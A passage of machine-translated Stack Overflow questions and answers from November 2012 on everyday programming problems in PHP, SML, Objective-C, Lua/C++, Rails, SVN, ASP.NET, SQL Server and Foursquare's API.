return $vclean;

}

echo cleaning("function is cleaning<br>");

?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T00:18:25.430

也许您期望该函数清除原始变量？

像：

```
$variable = '<p>foobar</p>';
cleaning($variable);
echo $variable; 
```

这不起作用，因为函数无法“看到”或更改在函数外部声明的变量。因此，您将看到 $variable 的旧值，而不是清理后的值。

如果是这种情况，您应该阅读有关[变量范围的信息](http://php.net/manual/en/language.variables.scope.php)

至于实际解决方案，您应该`return`在函数末尾清除变量，并执行以下操作：

```
$variable = '<p>foobar</p>';
$variable = cleaning($variable);
echo $variable; 
```

# google-analytics - 使用供应商数据和自定义广告系列的 Google Analytics（分析）跟踪转化

> ID：13280455
> 
> 赞同：1
> 
> 时间：2012-11-08T00:07:33.167
> 
> 标签：google-analytics

请帮助我理解这一点。我有一个客户，我们为他创建了一个抽奖“迷你网站”。流量是通过横幅广告、eBlasts 和时事通讯产生的。对于横幅广告，我创建了自定义网址，即 www.somewhere.com?utm_source=yahoo?utm_campaign=abc 来跟踪每个供应商/横幅的登录页面的流量。这很好用。

参赛者访问该页面，注册抽奖，并在电子邮件过程中进行双重选择以进行验证。我所有进入着陆页的流量都可以正常跟踪，并且被 utm_source 和 utm_campaign 正确分解。

一些供应商让我在确认页面上放置跟踪像素以获取转化统计信息。我在确认页面上放置的用于内部跟踪的唯一信息是 GA 跟踪代码。

我被告知要创建跟踪像素来跟踪各个供应商的转化。如果没有来自供应商的原始像素数据，这可能吗？我是跟踪像素的新手，但我的理解是我需要供应商提供一些信息才能编写像素代码。我错了吗？

我无法理解我们如何在没有广告系列名称或供应商跟踪像素的数据的情况下将跟踪像素放置在我们的末端，他们放置在包含我们横幅广告的页面上。

我在这里想念什么？当每个人都收到相同的双重选择电子邮件时，我如何才能真正将来自不同来源的转化流量分开？

如果我不清楚，请让我澄清。提前感谢您阅读我的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:15:16.163

您要在此处跟踪两件事。一是活动：活动是衡量*将*用户带到您的网站的技术的有效性的方式。

您要跟踪的*另一*件事是事件 - 这是用户到达您的站点后所做的事情。如果您想跟踪单个供应商的转化，您应该将 onclick 处理程序添加到提交按钮或您正在调用“转化”的链接

例如：

```
<a href="http:/mywebsite.com/checkout" onclick="_gaq.push(['_trackEvent', 'Category', 'Action', 'Label']);">Your link here</a> 
```

如果您将推送添加到表单提交，您可能希望在成功页面的页面加载上进行推送，而不是在提交的 onClick 上（否则它将跟踪事件，并且它可能实际上没有发生，因为例如形成验证错误）

# sml - 从 SML 中的集合 abstype 创建列表时的类型冲突

> ID：13280460
> 
> 赞同：1
> 
> 时间：2012-11-08T00:07:38.700
> 
> 标签：sml, ml

我觉得这应该比我做的更容易，但是我在使用这个函数时遇到了一些问题，应该将集合更改为列表。

```
fun explode(st(x, xs)) =
    let
        val listTemp = []
    in
        if isEmpty(xs) then listTemp::x else explode(xs)::x
    end
  | explode(nilset) = []; 
```

我遇到类型冲突，说我正在尝试从`''a list list`to `''a list`。任何帮助将非常感激。

编辑：说''a list -> ''a list list...哎呀。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T00:16:33.027

运算符的左操作数`::`应该是一个元素，右操作数应该是一个列表。您将列表用作左操作数，将元素用作右操作数。这就是类型错误。

假设生成列表的顺序无关紧要，您可以简单地切换操作数。如果确实重要，您仍然可以切换操作数，然后`List.rev`在构建完整列表后使用来反转结果列表。

# iphone - 简单的自定义 UIView 类损坏

> ID：13280463
> 
> 赞同：2
> 
> 时间：2012-11-08T00:07:57.580
> 
> 标签：iphone, objective-c, ipad, uiview, subclass

我制作了一个简单的 UIView 子类，它有几个子视图，但由于我看不到的原因而中断。

在我的故事板视图控制器中，我添加了一个 UIView 并使其成为我想要的形状，并向其中添加了我的自定义类。我的子类的内容如下：

```
@implementation PersonDetailCell

@synthesize button, requiredMarker, textField;

- (id)initWithFrame:(CGRect)frame
{
    self = [super initWithFrame:frame];
    if (self) {
        // Initialization code

    }
    return self;
}

-(void)layoutSubviews
{
    [self setBackgroundColor:[UIColor colorWithRed:87.0f/255.0f green:153.0f/255.0f blue:191.0f/255.0f alpha:1.0f]];

    textField = [[DetailTextField alloc] initWithFrame:CGRectMake(10, 0, self.frame.size.width -20, self.frame.size.height)];
    [textField setFont:[UIFont fontWithName:@"Helvetica" size:14.0f]];
    [textField setTextColor:[UIColor whiteColor]];
    [textField setHidden:YES];
    [self addSubview:textField];

    button = [[UIButton alloc] initWithFrame:CGRectMake(0, 0, self.frame.size.width, self.frame.size.height)];
    [button setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    [button setHidden:YES];
    [self addSubview:button];

    requiredMarker = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 4, 22)];
    [requiredMarker setBackgroundColor:[UIColor redColor]];
    [requiredMarker setHidden:YES];
    [self addSubview:requiredMarker];
}

/*
// Only override drawRect: if you perform custom drawing.
// An empty implementation adversely affects performance during animation.
- (void)drawRect:(CGRect)rect
{
    // Drawing code
}
*/

@end 
```

然后在我的视图控制器代码中，我导入了我的子类并将它的 IBOutlet 连接到我的故事板中的视图。在我的视图控制器的 viewDidLoad 中，我还尝试设置此视图的背景颜色，但没有任何反应。

我所有的代码都运行没有崩溃，但我的问题：

1.  我无法从我的视图控制器（或任何其他属性）设置背景颜色。

2.  当我运行应用程序时，高度超过了我在故事板中设置的高度（宽度很好），但我无处改变视图的高度。

有任何想法吗？我是否以某种方式使用了错误的方法？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:28:01.580

如果它是一个表格单元格，那么该类应该是扩展 UITableViewCell。可以在故事板上添加按钮和文本字段 - 然后您可以使用支柱和弹簧（尺寸检查器窗格）来确保正确调整视图大小。我认为 layoutSubviews 不应该用于添加新的 UI 元素（如果您需要手动调整大小，可能会用于调整大小）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T15:59:56.157

这是一些工作代码：

```
@interface ChildView()
@property (strong, nonatomic) UITextField *textField;
@property (strong, nonatomic) UIButton *button;
@property (strong, nonatomic) UIImageView *requiredMarker;
@end

@implementation ChildView

@synthesize textField= _textField;
@synthesize button = _button;
@synthesize requiredMarker = _requiredMarker;

-(id)initWithCoder:(NSCoder *)aDecoder
{
    self = [super initWithCoder:aDecoder];
    if (self)
    {
        [self setBackgroundColor:[UIColor colorWithRed:87.0f/255.0f green:153.0f/255.0f blue:191.0f/255.0f alpha:1.0f]];

        self.textField = [[UITextField alloc] init];
        [self.textField setFont:[UIFont fontWithName:@"Helvetica" size:14.0f]];
        [self.textField setTextColor:[UIColor whiteColor]];
        self.textField.text = @"Test text";
        [self addSubview:self.textField];

        self.button = [[UIButton alloc] init];
        self.button.backgroundColor = [UIColor greenColor];
        [self addSubview:self.button];

        self.requiredMarker = [[UIImageView alloc] init];
        [self.requiredMarker setBackgroundColor:[UIColor redColor]];
        [self addSubview:self.requiredMarker];
    }
    return self;
}

-(void)layoutSubviews
{
    CGSize hostSize = self.frame.size;
    float length = 22;
    self.textField.frame = CGRectMake(10, length, hostSize.width, hostSize.height-length);
    self.button.frame = CGRectMake(0, 0, hostSize.width, length);
    self.requiredMarker.frame = CGRectMake(0, 0, 4, length);
}

@end 
```

# ruby-on-rails - 使用瘦启动脚本时卡在“使用 Rails 适配器”

> ID：13280466
> 
> 赞同：0
> 
> 时间：2012-11-08T00:08:02.380
> 
> 标签：ruby-on-rails, thin

我正在跑步`bundle exec thin -p 4000 -e sandbox start 2>&1`，我得到：

`>> Using rails adapter`

它只是挂在那里，我不认为我的 Rails 适配器正在运行。是否`thin`有日志或我可以看到的东西以了解发生了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T17:09:08.317

原来我不得不用它`foreman`来启动和运行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T00:48:45.393

看看这个网站

[http://code.macournoyer.com/thin/doc/classes/Thin/Logging.html](http://code.macournoyer.com/thin/doc/classes/Thin/Logging.html)

它具有您记录适配器所需的信息

# python - 用于 Python 的模块，以便您可以生成一个独立的、自记录的命令行实用程序 ala Perl 的 pod2man/pod2usage？

> ID：13280468
> 
> 赞同：1
> 
> 时间：2012-11-08T00:08:19.637
> 
> 标签：python, command-line, documentation-generation

我能找到的只是这个参考：

[是否可以在 Python 中使用 POD（普通旧文档）？](https://stackoverflow.com/questions/12034512/is-it-possible-to-use-podplain-old-documentation-with-python)

看起来您必须生成一整套单独的文档才能与代码一起使用。

我想尝试使用 Python 来制作 cmdline 实用程序，但是当我使用 Perl 执行此操作时，我可以将文档直接嵌入源代码中，并将 Pod2Usage 模块与 Getopt 一起使用，这样我的任何脚本都可以像这样运行：

```
cmd --man 
```

这会触发 pod 系统以手册页格式转储嵌入在脚本中的文档。它还可以生成较短（概要）或中等格式。

看起来我可以使用 pydoc 代码并对其进行逆向工程来完成任务（至少显示完整的文档），但我希望已经存在更好的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T23:15:07.610

[python-modargs](http://pypi.python.org/pypi/python-modargs)包允许您创建自记录的命令行界面。您为每个要使用的命令定义一个函数，该函数的文档字符串将成为该函数的帮助文本。函数的关键字参数成为命名参数，python-modargs 将在关键字参数之后解析内联注释以作为该参数的帮助文本。

我使用 python-modargs 为 dexy 生成命令行界面，这里是定义命令的模块： [https ://github.com/ananelson/dexy/blob/027954f9234363d506225d40b675b3d6478994f4/dexy/commands.py#L144](https://github.com/ananelson/dexy/blob/027954f9234363d506225d40b675b3d6478994f4/dexy/commands.py#L144)

您需要实现一个 help_command 方法来获取生成的帮助，它是一个 1-liner。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T00:22:06.673

我认为[pydoc](http://docs.python.org/2/library/pydoc.html)可能是您正在寻找的。

它当然与 POD 不太一样，因为您必须调用**pydoc**本身（例如`pydoc myscript.py`），但我想这可能是一个很好的起点。

当然，您始终可以通过从脚本导入并使用它的函数/类来为脚本添加 pydoc 支持。查看[pydoc 自己的 cli 实现](http://hg.python.org/cpython/file/2.7/Lib/pydoc.py#l2276)以获得最佳示例。

# c++ - 从 C++ 访问函数环境中的 Lua 变量

> ID：13280474
> 
> 赞同：4
> 
> 时间：2012-11-08T00:08:42.257
> 
> 标签：c++, lua

这可能是一个简单的问题，但我很难过。这适用于 Lua 5.1。

我有一个在自己的环境中运行的脚本。在那个环境中，我有一个从 C++ 设置的名为“plugin”的变量，如下所示：

```
 lua_getfield(L, LUA_REGISTRYINDEX, getScriptId());  // Put script's env table onto the stack  -- env_table

    lua_pushstring(L, "plugin");  //                           -- env_table, "plugin"
    luaW_push(L, this);       //                               -- env_table, "plugin", *this
    lua_rawset(L, -3);        // env_table["plugin"] = *this   -- env_table

    lua_pop(L, -1);           // Cleanup                       -- <<empty stack>> 
```

在运行我的 Lua 脚本之前，我将函数环境设置为：

```
 lua_getfield(L, LUA_REGISTRYINDEX, getScriptId());    // Push REGISTRY[scriptId] onto stack           -- function, table
 lua_setfenv(L, -2);                                   // Set that table to be the env for function    -- function 
```

当我的脚本运行时，它可以按预期看到插件变量并与之交互。到目前为止，一切都很好。

在某一时刻，Lua 脚本调用了一个 C++ 函数，在该函数中，我想查看是否设置了插件变量。

我已经尝试了很多东西，但我似乎看不到插件变量。以下是我尝试过的 4 件事：

```
lua_getfield(L, LUA_ENVIRONINDEX, "plugin");
bool isPlugin = !lua_isnil(L, -1);
lua_pop(L, 1);    // Remove the value we just added from the stack

lua_getfield(L, LUA_GLOBALSINDEX, "plugin");
bool isPlugin2 = !lua_isnil(L, -1);
lua_pop(L, 1);    // Remove the value we just added from the stack

lua_getglobal(L, "plugin");
bool isPlugin3 = !lua_isnil(L, -1);
lua_pop(L, 1);    // Remove the value we just added from the stack

lua_pushstring(L, "plugin");
bool isPlugin4 = lua_isuserdata(L, -1);
lua_pop(L, 1); 
```

不幸的是，所有 isPlugin 变量都返回 false。就好像从 Lua 调用的 C++ 函数看不到 Lua 环境中设置的变量。

知道如何从 C++ 中查看插件变量吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T03:58:14.940

Lua 中的每个函数都有*自己的*环境。他们不会继承任何称呼他们的人的环境。因此，如果您的 C++ 函数不使用具有此`plugin`变量的环境，那么它将看不到它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T04:05:21.807

您可以将环境作为闭包的一部分传递给 C 函数（请参阅 参考资料`lua_pushcclosure`）。我不知道你有什么样的设置，但我可以看到这可以通过三种方式实现：

1）您的 C 函数与该函数在相同的环境中注册 - 很好，可以工作。
2）您的 C 函数已在全局环境中注册，但将调用它的 Lua 函数都驻留在一个特定环境中 - 如果在注册函数时环境存在（因此可以将其添加到闭包中），它仍然可以工作。
3）您的 C 函数已在全局环境中注册，并且可以由在不同环境中工作的不同 Lua 函数调用 - 将不再工作。

如果是 2 或 3，那么如果您将实现更改为使用变体 1，则可能没有任何缺点。

编辑：好的，这样就行不通了。如果您愿意偏离 Lua API，有一种方法可以获取底层信息。免责声明：我正在使用 5.2，因此我正在尝试将我的方法调整为 5.1。我无法对此进行测试，它可能无法正常工作。

首先你需要`#include "lstate.h"`

这是 5.1 中的 lua_State 结构：

```
struct lua_State {
  CommonHeader;
  lu_byte status;
  StkId top;  /* first free slot in the stack */
  StkId base;  /* base of current function */
  global_State *l_G;
  CallInfo *ci;  /* call info for current function */
  const Instruction *savedpc;  /* `savedpc' of current function */
  StkId stack_last;  /* last free slot in the stack */
  StkId stack;  /* stack base */
  CallInfo *end_ci;  /* points after end of ci array*/
  CallInfo *base_ci;  /* array of CallInfo's */
  int stacksize;
  int size_ci;  /* size of array `base_ci' */
  unsigned short nCcalls;  /* number of nested C calls */
  lu_byte hookmask;
  lu_byte allowhook;
  int basehookcount;
  int hookcount;
  lua_Hook hook;
  TValue l_gt;  /* table of globals */
  TValue env;  /* temporary place for environments */
  GCObject *openupval;  /* list of open upvalues in this stack */
  GCObject *gclist;
  struct lua_longjmp *errorJmp;  /* current error recover point */
  ptrdiff_t errfunc;  /* current error handling function (stack index) */
}; 
```

假设 L 是您的`lua_State*`. 如您所见，`L->ci`保存当前的 callinfo，并且 callinfo 数组包含在`L->base_ci`和之间`L->end_ci`。

所以调用你的 C 函数的 Lua 函数位于`(L->end_ci-2)`（应该与 相同`(L->ci-1)`），并且它的堆栈 id (StkId) 是`(L->end_ci-2)->func`. 我们可以通过以下方式欺骗 Lua API，让您使用低于当前调用函数的堆栈 ID：

```
StkId saved = L->base;
L->base = L->base_ci->base;
int idx = (L->end_ci-2)->func - L->base+1;
lua_getfenv(L, idx);
L->base = saved; 
```

环境表现在应该在堆栈的顶部。

编辑：Lua API 检查有效索引有点棘手。这应该愚弄他们。

# c++ - 向上转换 std::shared_ptr 会导致段错误

> ID：13280487
> 
> 赞同：3
> 
> 时间：2012-11-08T00:09:26.113
> 
> 标签：c++, c++11, smart-pointers

这是一个过度简化，但我无法重现这个问题。

```
#include <memory>

class Base
{
};
class Derived : public Base
{
};

void doSomethingPolymorphical(std::shared_ptr<Base> basePointer)
{
}

int main(int argc, char** argv)
{
    std::shared_ptr<Derived> sharedObject = std::make_shared<Derived>();
    doSomethingPolymorphical(sharedObject);
    return 0;
} 
```

静态检查没有发现错误，这个程序运行良好。但是在一个更复杂的程序中，我得到了不可调试的段错误。我试图改变

```
std::shared_ptr<Derived> sharedObject = std::make_shared<Derived>(); 
```

为了

```
std::shared_ptr<Base> sharedObject = std::make_shared<Derived>(); 
```

问题就消失了。

我想问一下，`shared_ptr`我在这里忽略的“向上转换”是否存在一些问题，或者我的段错误是否来自其他地方。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T02:17:43.700

要做的一件事是在基类中定义虚拟析构函数，这样当 shared_ptr 超出范围时将调用正确的 dtor

OTOH：似乎是 VS2010 中的错误，gcc 4.8 可以编译和链接

以下代码无法与 VS2010 链接并出现错误：

1>Derived.obj : 错误 LNK2005: "public: __thiscall Derived::Derived(void)" (??0Derived@@QAE@XZ) 已在 cpp.obj 中定义 1>Derived.obj: 错误 LNK2005: "public: virtual __thiscall Derived::~Derived(void)" (??1Derived@@UAE@XZ) 已在 cpp.obj 中定义

```
#include <memory>
#include <iostream>

class Base
{
public:

    Base()
    {}

    virtual ~Base()
    {}

    virtual void Print() const
    {
        std::cout << "from Base::Print" << std::endl;
    }
};

class Derived : public Base
{
public:
    Derived() : Base()
    {}

    ~Derived()
    {}

    void Print() const
    {
        std::cout << "from Derived::Print" << std::endl;
    }
};

void doSomethingPolymorphical(std::shared_ptr<Base> basePointer)
{
    basePointer->Print();
}

int main(int argc, char** argv)
{
    std::shared_ptr<Derived> sharedObject = std::make_shared<Derived>();
    doSomethingPolymorphical(sharedObject);
    return 0;
} 
```

# jquery - jQuery：函数只有在后面跟着一个损坏的函数时才有效

> ID：13280499
> 
> 赞同：0
> 
> 时间：2012-11-08T00:10:49.933
> 
> 标签：jquery, ruby-on-rails-3, wysihtml5

这正是它听起来的样子。我在我的 Rails 应用程序中有[一个 groovy 小插件](https://github.com/jhollingworth/bootstrap-wysihtml5)，用于丰富文本字段区域。它工作正常，除了在应该只有一个时出现两个工具栏的事实。

```
$('#user_address').wysihtml5(); 
```

但是，如果我在它下面放了一个类似的函数，它什么都不引用：

```
$('#this_thing').this_is_broken(); 
```

然后它修复了两个工具栏问题，但破坏了我正在进行的所有其他 jQuery 函数。

有任何想法吗？对我来说听起来像是一个错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T00:17:36.580

有道理 - this_is_broken() 导致浏览器停止解析当前脚本。因为 javascript 是宽容的，所以页面会显示，但您的代码尚未完全加载。找出第二次调用 wysihtml5() 的位置。使用大量的 console.log()s :)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T00:44:41.120

感谢@Cyle Hunter 的回答：我包含了两次 JS 文件。

# svn - “文件夹”已被“文件夹”锁定

> ID：13280500
> 
> 赞同：22
> 
> 时间：2012-11-08T00:10:54.207
> 
> 标签：svn, version-control, merge, tortoisesvn

我有一个非常烦人的问题，我试图将我们的主干合并到我的分支中以进行一些更新。我每天都这样做，但几乎每一天我都会收到以下错误：

```
Error - 'D:\Code\Website' is already locked via 'D:\Code\Website'. 
```

只有非常随机地不会发生此错误，并且我能够成功地将主干合并回分支。但是，我整天都在尝试从后备箱中获取最新信息，但没有成功。我一直在寻找这个问题的答案。所以，谷歌，互联网上的随机论坛......等等。我希望有人能解释为什么会发生这种情况。

这是我已经尝试过的：

*   对目录中的每个文件夹运行“清理”。
*   检查 .svn 目录中的“锁定”文件 - 不存在。
*   打开 wc.db 文件并检查 WC_LOCK 表 - 里面什么都没有。
*   禁用防病毒。
*   禁用 IIS。
*   检查了分支的新副本。
*   更新 TortoiseSVN
*   使用 TortoiseSVN.net (1.7.10.23359, SVN 1.7.7) 的最新 MSI 完成卸载并重新安装 TortoiseSVN。

我能够更新分支并提交它.. 从来没有问题。只是将主干合并回来导致我出现问题。团队中的其他人似乎没有这个问题（这个分支或任何其他分支）。他们可以自由地检查分支。合并主干并毫无问题地提交它。

我正在使用 TortoiseSVN。你们得到的任何帮助都会很棒！

编辑：另外，测试合并有效..但实际合并没有。

**更新**

事实证明，TSVNCache.exe 不断地持有 wc.db 文件的锁。我不知道为什么。即使我杀死了这个过程；一旦我通过 TSVN 合并 GUI，它会再次启动缓存并锁定它。我已经设法通过命令行成功合并..有没有办法解决缓存锁定问题以避免不得不依赖命令行？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-08T02:23:37.350

尝试关闭图标覆盖状态缓存（TSVNcache.exe 进程负责什么）

1.  打开资源管理器窗口
2.  右键单击任意位置，TortoiseSVN -> 设置
3.  转到“图标叠加层”部分
4.  选择状态缓存下的“无”单选按钮
5.  单击应用

大概如果状态缓存被禁用并且 TSVNcache.exe 没有运行，那么它就不能锁定任何文件。您至少可以排除这是否是问题（听起来确实如此）。这是负责使用绿色复选标记、红色修改标记等更新资源管理器中的文件夹/文件图标的过程。多年来，出于性能原因，我已禁用此功能。我只是查看修改过的文件或打开提交对话框以查看哪些文件已更改。

在那之后，下一个最有可能的嫌疑人是过去经验中的索引服务（Windows 搜索）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-12-12T20:44:47.017

我有同样的问题。这是我所做的：

1.  在任务管理器中杀死 explorer.exe
2.  从任务管理器重新启动
3.  现在合并工作......

我猜想 Windows 资源管理器会以某种方式锁定某些东西。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-07-02T12:59:27.730

另一个对我有用而不是放弃图标覆盖的选项是将 Windows 资源管理器中的目录更改为非 svn 文件夹，这样 TortoiseSVN 不会与自身冲突。这很烦人，但如果你需要一个快速的解决方案 - 就是这样。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-30T08:24:51.853

我现在有同样的问题。特别是因为我的存储库正在努力增长。

TSVNCache 锁定工作副本的指针让我思考。为什么会这样做？结论：仅在忙于更新工作副本状态（包括图标覆盖）时。

克服这个问题的一种方法正是 Joshua McKinnon 所说的：禁用图标覆盖。如果这不是您想要的解决方案（因为您想保留图标），您也可以采用不同的方法：等到 TSVNCache 完成其工作。当您打开合并窗口时，您可以看到 TSVNCache 正忙（在进程资源管理器中）。当忙碌结束时，可以安全地进行合并。从此不再有锁定问题！

# c# - 使用 .net 中的 ajax 编辑器将焦点设置在页面上的第一个文本框

> ID：13280504
> 
> 赞同：1
> 
> 时间：2012-11-08T00:11:10.100
> 
> 标签：c#, javascript, ajax

我有一个带有几个文本框、下拉菜单的 Web 表单，最后在页面末尾是 4 个自定义 ajax 编辑器。因此，在页面加载时，焦点始终在最后一个编辑器内，而不是在第一个文本框或页面顶部。在每个页面加载时，光标进入最后一个编辑器控件。如何将焦点放在第一个文本框内? 以下是我尝试过的几种方法

`1.<body onload="document.body.scrollTop = 0;">`

```
2\.    void Page_Init(object sender, EventArgs e)
{

    SetFocus(txtReqtitle);

} 
```

对于上述内容，在加载页面时，我可以看到焦点转到所需的文本框，然后转到最后一个自定义控件。

```
3\.    if(!Page.ClientScript.IsStartupScriptRegistered("scrFocus"))
           {
              string strScript="var txtBox=document.getElementById('" + txtReqtitle.ClientID.ToString() +"');txtBox.focus();";
               ClientScript.RegisterStartupScript(this.GetType(),"scrFocus", strScript,true);

            } 
```

4.

```
function setFocus() {
document.getElementById("txtReqtitle").focus(); 
```

}

```
5\. ScriptManager.GetCurrent(this.Page).SetFocus(txtReqtitle); 
```

有任何想法吗？谢谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:31:51.280

由于 ajax 编辑器，似乎焦点属性在加载事件中不起作用

请在 Page Prerendercomplete() 事件中添加 txtReqtitle.Focus() 并让我知道它是否有效

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-14T22:01:48.393

found the solution which worked for me .would like to share it .. its simple ..just make the autofocus=false for the control.

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-08T00:31:34.120

使用 jQuery

```
$(document).ready(function(){
    $('#<%= txtReqtitle.ClientID %>').focus();
}); 
```

# objective-c - 从 NSMutableArray 获取数据并将数据传递给故事板中的 DetailView

> ID：13280507
> 
> 赞同：0
> 
> 时间：2012-11-08T00:11:15.290
> 
> 标签：objective-c, ios, uitableview, nsmutablearray, uistoryboardsegue

我有一个像这样的 plist 文件

```
<array>

    <array>

        <dict>

            <key>name</key>

            <string>Ryan</string>

            <key>image</key>

            <string>088i.png</string>

            <key>webSiteURL</key>

            <string>http://www.ryan.com</string>

            <key>category</key>

            <string>Monday</string>

        </dict>

    </array>

    <array>

        <dict>

            <key>name</key>

            <string>Pinky</string>
            <key>image</key>

            <string>089i.png</string>

            <key>webSiteURL</key>

            <string>http://www.pinky.com</string>

            <key>category</key>

            <string>Sunday</string>

        </dict>

        <dict>

            <key>name</key>

            <string>Kitty</string>

            <key>image</key>

            <string>098i.png</string>

            <key>webSiteURL</key>

            <string>http://www.kitty.com</string>

            <key>category</key>

            <string>Sunday</string>

        </dict>

    </array>

</array> 
```

这个 plist 将作为 NSMutableArray 加载到 NSTableView，现在我想将数据传递给 DetailView，实际上如何获取特定数据？

我用

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
    if ([[segue identifier] isEqualToString:@"TableToWebSegue"]) {
        NormalDetailView *detailViewController = [segue destinationViewController];

        detailViewController.webSiteURL = [[_cellContentList objectAtIndex:indexPath.row] objectForKey:@"webSiteURL"]
    } } 
```

但它说 indexPath 是错误的，应该是 NSIndexPath，我将它更改为 NSIndexPath 但它说 .row 是错误的......

这是我的第一个应用程序，我不知道在这种情况下如何获取数据，如果我想获取 webSiteURL，该怎么做？如何将其传递给详细视图？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:59:23.447

如果您的 prepareForSegue 方法位于作为主控制器的 UITableViewController 中，则只需将此行添加到您的 prepareForSegue 方法中：

```
 NSIndexPath *indexPath = [self.tableView indexPathForSelectedRow]; 
```

然后，您可以像在帖子中一样使用 indexPath.row。

编辑后：针对您的评论，我查看了您的项目，并且在 NormalViewController 的 lis 行上发生了错误：

```
detailViewController.name = [[_cellContentList objectAtIndex:indexPath.row] objectForKey:@"name"]; 
```

问题是， [_cellContentList objectAtIndex:indexPath.row] 是一个 NormalCategory 对象，它没有 objectForKey: 方法。它有一个 normalList 属性，它本身有 2 个 normalData 对象，它们又具有一个“name”属性。我认为这是您要访问的名称属性，但是是哪一个？由于有 2 个 normalData 对象，您必须有一种方法来选择您想要的。在我看来，您的数据结构过于复杂和令人困惑（至少对我而言）。

# ruby-on-rails-3 - 使用 url 中的用户名登录后设计重定向

> ID：13280514
> 
> 赞同：2
> 
> 时间：2012-11-08T00:12:26.843
> 
> 标签：ruby-on-rails-3, devise

我正在努力设计在登录后重定向到用户的个人资料页面。我的路线文件如下所示：

```
get "profiles/index"

get "users/index"

get "users/show"

authenticated :user do
 root :to => 'home#index'
end
root :to => "home#index"
devise_for :users
resources :users
scope ":username", :as => "user" do
 match '/', :to => 'profiles#index'
end 
```

我希望它重定向到 /myusername 用户的个人资料页面。谢谢你们的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T00:21:04.867

如果要更改登录重定向，可以通过添加新的 SessionsController 来覆盖 after_sign_in_path_for 方法，如下所示：

```
class SessionsController < Devise::SessionsController  

  #after_sign_in_path_for is called by devise
  def after_sign_in_path_for(user)
   "/users/#{user.username}" #adjust the returned path as needed
  end  

end 
```

正如 Ashikata 提到的，如果您要更改会话控制器，则需要将设计路由更改为以下内容。

```
devise_for :users, :controllers => { :sessions => 'sessions' } 
```

* * *

或者，将修改后的 after_sign_in_path_for 方法添加到您的应用程序控制器应该可以解决问题。

# php - symfony2 登录不工作 FOSUSerBundle

> ID：13280516
> 
> 赞同：-1
> 
> 时间：2012-11-08T00:12:48.857
> 
> 标签：php, session, authentication, symfony, fosuserbundle

帮助！我不知道为什么，但最近我无法再登录我的 Symfony2 网站。当我尝试登录时，我只是被重定向回登录页面，没有错误，也没有任何问题的迹象。我已经清除了我的 apc 缓存、我的 prod 和 dev 缓存，并且我已经能够在 dev 和 prod 中重现该错误。我已经递归地设置了 g+wrx 和 u+rwx 。

没有抛出异常时如何调试登录页面？该错误发生在多台机器上的多个浏览器中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:33:23.667

事实证明，我的 security.yml 中的 form_login check_path 和我的 FOSUserBundle 路由信息的根目录之间存在不同步。因为两者没有同步，所以单击登录页面只会导致页面重定向，而不是将其传递给登录类。

# sql-server - SQL Server 2005 中的视图中的 ROW_NUMBER()

> ID：13280520
> 
> 赞同：0
> 
> 时间：2012-11-08T00:13:27.550
> 
> 标签：sql-server, sql-server-2005, view, ssms, row-number

我在 Microsoft SQL Server Management Studio 中尝试了以下查询：

```
select 
   ROW_NUMBER() OVER(ORDER BY ret_id, dep_id DESC) AS 'Row Number' 
from 
   Round_Trip_View 
```

它有效。

我已经尝试过同样的方法来创建一个视图，但它崩溃了。

任何的想法？

我希望在我看来为每一行分配一种 id，我很欣赏任何替代想法:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T13:45:11.043

问题是视图向导。
我学到了什么：当你可以编码时，永远不要使用向导！:)

# api - 过滤 Foursquare 场地结果

> ID：13280521
> 
> 赞同：0
> 
> 时间：2012-11-08T00:13:34.317
> 
> 标签：api, location, foursquare

我目前正在评估几种不同的 API 以获得场地信息。任何提供商的一个关键组成部分是不仅能够返回附近的**所有**场所，而且能够根据之前输入的用户偏好定制列表。

Foursquare 不允许将他们的场地数据与其他数据（例如 Google 的地点）“混合”来创建聚合服务。**但是，我能否将 Foursquare 的场地用于特定区域，根据用户偏好和推荐引擎技术应用一些过滤，并呈现其信息的修改后的个性化版本？即使给出了最终结果的归属，他们是否只使用他们的场地信息作为起点而皱眉？**

这种定制将超越使用零售商类别，可以包含在 facebook 请求中。询问是因为其他服务需要完全按照 API 返回的结果呈现，包括广告。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T07:15:41.763

[首先，在https://developer.foursquare.com/overview/community](https://developer.foursquare.com/overview/community)查看政策

> 我们欢迎您使用foursquare 作为您的位置数据库。您可以在您的系统中将其他内容与我们的场地数据相关联，但您不得将我们的数据库与其他数据库合并或自行导出。

我认为他们甚至鼓励您操纵数据并使用它创建创造性的解决方案，只要您不违反他们不将其与另一个数据库合并的基本规则（请参阅链接中的全文）。

